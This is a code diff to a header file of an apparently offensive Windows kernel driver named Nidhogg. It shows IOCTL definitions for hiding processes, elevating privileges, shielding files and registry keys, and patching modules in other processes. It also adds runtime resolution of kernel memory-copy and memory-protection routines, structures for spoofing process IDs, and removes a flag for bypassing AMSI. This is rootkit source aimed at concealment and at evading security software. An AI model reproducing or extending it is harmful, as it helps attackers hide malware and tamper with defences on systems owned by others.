@@ -17,7 +17,7 @@
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -28,8 +28,11 @@
 #define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *****************************************************************************************************
 
+#define MAX_PATCHED_MODULES 256
 #define MAX_PIDS 256
 #define MAX_PATH 260
 #define MAX_FILES 256
@@ -43,27 +46,72 @@ DRIVER_UNLOAD NidhoggUnload;
 DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
 void ClearAll();
 
+typedef NTSTATUS(NTAPI* tZwProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, SIZE_T* NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
+typedef NTSTATUS(NTAPI* tMmCopyVirtualMemory)(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
+typedef PPEB(NTAPI* tPsGetProcessPeb)(PEPROCESS Process);
+
 // Globals.
 PVOID registrationHandle = NULL;
 
+// --- ModuleUtils structs ----------------------------------------------------
+struct DynamicImportedModulesGlobal {
+	tZwProtectVirtualMemory ZwProtectVirtualMemory;
+	tMmCopyVirtualMemory	MmCopyVirtualMemory;
+	tPsGetProcessPeb		PsGetProcessPeb;
+
+	void Init() {
+		UNICODE_STRING routineName;
+		RtlInitUnicodeString(&routineName, L"ZwProtectVirtualMemory");
+		ZwProtectVirtualMemory = (tZwProtectVirtualMemory)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
+		MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
+		PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
+	}
+};
+DynamicImportedModulesGlobal dimGlobals;
+
+struct PatchedModule {
+	ULONG Pid;
+	PVOID Patch;
+	ULONG PatchLength;
+	CHAR* FunctionName;
+	WCHAR* ModuleName;
+};
+// ----------------------------------------------------------------------------
+
+// --- ProcessUtils structs ---------------------------------------------------
+struct Process {
+	int type;
+	ULONG ProcessPid;
+	ULONG SpoofedPid;
+};
+
+struct SpoofedProcessesList {
+	int PidsCount;
+	Process* Processes[MAX_PIDS];
+};
+
 struct ProcessesList {
 	int PidsCount;
-	ULONG Pids[MAX_PIDS];
+	ULONG Processes[MAX_PIDS];
 };
 
 struct ProcessGlobals {
-	bool BypassAMSI;
-	ProcessesList Processes;
+	ProcessesList ProtectedProcesses;
+	SpoofedProcessesList SpoofedProcesses;
 	FastMutex Lock;
 
 	void Init() {
-		BypassAMSI = false;
-		Processes.PidsCount = 0;
+		ProtectedProcesses.PidsCount = 0;
+		SpoofedProcesses.PidsCount = 0;
 		Lock.Init();
 	}
 };
 ProcessGlobals pGlobals;
+// ----------------------------------------------------------------------------
 
+// --- FilesUtils structs -----------------------------------------------------
 struct FileItem {
 	int FileIndex;
 	WCHAR FilePath[MAX_PATH];
@@ -84,7 +132,9 @@ struct FileGlobals {
 	}
 };
 FileGlobals fGlobals;
+// ----------------------------------------------------------------------------
 
+// --- RegistryUtils structs --------------------------------------------------
 struct RegItem {
 	int RegItemsIndex;
 	ULONG Type;
@@ -123,82 +173,4 @@ struct RegistryGlobals {
 	}
 };
 RegistryGlobals rGlobals;
-
-// Undocumented structs
-struct _OBJECT_TYPE_INITIALIZER_TEMP
-{
-	USHORT Length;                                                          //0x0
-	union
-	{
-		USHORT ObjectTypeFlags;                                             //0x2
-		struct
-		{
-			UCHAR CaseInsensitive : 1;                                        //0x2
-			UCHAR UnnamedObjectsOnly : 1;                                     //0x2
-			UCHAR UseDefaultObject : 1;                                       //0x2
-			UCHAR SecurityRequired : 1;                                       //0x2
-			UCHAR MaintainHandleCount : 1;                                    //0x2
-			UCHAR MaintainTypeList : 1;                                       //0x2
-			UCHAR SupportsObjectCallbacks : 1;                                //0x2
-			UCHAR CacheAligned : 1;                                           //0x2
-			UCHAR UseExtendedParameters : 1;                                  //0x3
-			UCHAR Reserved : 7;                                               //0x3
-		};
-	};
-	ULONG ObjectTypeCode;                                                   //0x4
-	ULONG InvalidAttributes;                                                //0x8
-	struct _GENERIC_MAPPING GenericMapping;                                 //0xc
-	ULONG ValidAccessMask;                                                  //0x1c
-	ULONG RetainAccess;                                                     //0x20
-	enum _POOL_TYPE PoolType;                                               //0x24
-	ULONG DefaultPagedPoolCharge;                                           //0x28
-	ULONG DefaultNonPagedPoolCharge;                                        //0x2c
-	VOID(*DumpProcedure)(VOID* arg1, struct _OBJECT_DUMP_CONTROL* arg2);   //0x30
-	LONG(*OpenProcedure)(enum _OB_OPEN_REASON arg1, CHAR arg2, struct _EPROCESS* arg3, VOID* arg4, ULONG* arg5, ULONG arg6); //0x38
-	VOID(*CloseProcedure)(struct _EPROCESS* arg1, VOID* arg2, ULONGLONG arg3, ULONGLONG arg4); //0x40
-	VOID(*DeleteProcedure)(VOID* arg1);                                    //0x48
-	union
-	{
-		LONG(*ParseProcedure)(VOID* arg1, VOID* arg2, struct _ACCESS_STATE* arg3, CHAR arg4, ULONG arg5, struct _UNICODE_STRING* arg6, struct _UNICODE_STRING* arg7, VOID* arg8, struct _SECURITY_QUALITY_OF_SERVICE* arg9, VOID** arg10); //0x50
-		LONG(*ParseProcedureEx)(VOID* arg1, VOID* arg2, struct _ACCESS_STATE* arg3, CHAR arg4, ULONG arg5, struct _UNICODE_STRING* arg6, struct _UNICODE_STRING* arg7, VOID* arg8, struct _SECURITY_QUALITY_OF_SERVICE* arg9, struct _OB_EXTENDED_PARSE_PARAMETERS* arg10, VOID** arg11); //0x50
-	};
-	LONG(*SecurityProcedure)(VOID* arg1, enum _SECURITY_OPERATION_CODE arg2, ULONG* arg3, VOID* arg4, ULONG* arg5, VOID** arg6, enum _POOL_TYPE arg7, struct _GENERIC_MAPPING* arg8, CHAR arg9); //0x58
-	LONG(*QueryNameProcedure)(VOID* arg1, UCHAR arg2, struct _OBJECT_NAME_INFORMATION* arg3, ULONG arg4, ULONG* arg5, CHAR arg6); //0x60
-	UCHAR(*OkayToCloseProcedure)(struct _EPROCESS* arg1, VOID* arg2, VOID* arg3, CHAR arg4); //0x68
-	ULONG WaitObjectFlagMask;                                               //0x70
-	USHORT WaitObjectFlagOffset;                                            //0x74
-	USHORT WaitObjectPointerOffset;                                         //0x76
-};
-
-struct _EX_PUSH_LOCK_TEMP
-{
-	union
-	{
-		struct
-		{
-			ULONGLONG Locked : 1;                                             //0x0
-			ULONGLONG Waiting : 1;                                            //0x0
-			ULONGLONG Waking : 1;                                             //0x0
-			ULONGLONG MultipleShared : 1;                                     //0x0
-			ULONGLONG Shared : 60;                                            //0x0
-		};
-		ULONGLONG Value;                                                    //0x0
-		VOID* Ptr;                                                          //0x0
-	};
-};
-
-typedef struct _OBJECT_TYPE_TEMP
-{
-	struct _LIST_ENTRY TypeList;                                            //0x0
-	struct _UNICODE_STRING Name;                                            //0x10
-	VOID* DefaultObject;                                                    //0x20
-	UCHAR Index;                                                            //0x28
-	ULONG TotalNumberOfObjects;                                             //0x2c
-	ULONG TotalNumberOfHandles;                                             //0x30
-	ULONG HighWaterNumberOfObjects;                                         //0x34
-	ULONG HighWaterNumberOfHandles;                                         //0x38
-	struct _OBJECT_TYPE_INITIALIZER_TEMP TypeInfo;                               //0x40
-	struct _EX_PUSH_LOCK_TEMP TypeLock;                                          //0xb8
-	ULONG Key;                                                              //0xc0
-	struct _LIST_ENTRY CallbackList;                                        //0xc8
-} OBJECT_TYPE_TEMP, * POBJECT_TYPE_TEMP;
+// ----------------------------------------------------------------------------
